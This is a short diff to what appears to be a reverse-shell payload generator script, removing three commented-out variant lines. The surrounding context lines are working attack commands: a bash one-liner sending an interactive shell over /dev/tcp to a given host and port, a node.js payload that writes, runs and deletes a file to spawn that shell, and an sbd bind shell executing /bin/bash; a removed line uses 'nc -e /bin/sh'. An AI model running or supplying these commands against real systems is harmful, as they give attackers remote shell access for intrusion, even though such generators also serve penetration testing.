@@ -71,7 +71,6 @@ function _awk_(){
 function _bash_(){
 
 	printf "bash -c \"bash -i >& /dev/tcp/$2/$3 0>&1\"\n"
-#	printf "bash -c \"bash -l > /dev/tcp/$2/$3 0<&1 2>&1\""
 }
 
 function _c_(){
@@ -231,7 +230,6 @@ cat << EOF
 echo "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/$2/$3 0>&1\"')" > payload.js && nodejs payload.js && rm payload.js
 
 EOF
-#	printf "echo \"require('child_process').exec('nc -e /bin/sh $2 $3')\" > payload.js && nodejs payload.js && rm payload.js\n\n"
 }
 
 
@@ -477,7 +475,6 @@ function _telnet_(){
 
 function _sbd_(){
 	printf "sbd -lvp $3 -e /bin/bash\n"
-#	printf "sbd -lvp $3 -e /bin/sh\n"
 }
 
 function _socat_(){
